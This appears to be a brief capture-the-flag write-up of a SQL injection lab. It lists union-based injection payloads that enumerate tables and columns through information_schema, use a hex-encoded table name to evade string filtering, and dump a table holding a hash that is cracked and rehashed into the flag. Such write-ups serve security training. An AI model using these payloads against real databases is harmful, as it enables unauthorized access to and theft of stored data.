# Vulnerability

Get all the tables name on the Database:
```
1 and 1=0 union select null,table_name from information_schema.tables limit 41,4
```

Get the fields available of the list_images table:
`0x6c6973745f696d61676573` is basically `list_images` but since we can't use strings we put it in hex form
```
1 and 1=0 union select null,column_name from information_schema.columns where table_name=0x6c6973745f696d61676573
```

Get the flag:
```
1 and 1=0 union select title,comment from list_images limit 4,1
```

`1928e8083cf461a51303633093573c46` -> albatroz 
`echo -n "albatroz" | shasum -a 256` -> got the flag

# Exploit

See 11...

# Protection

See 11...
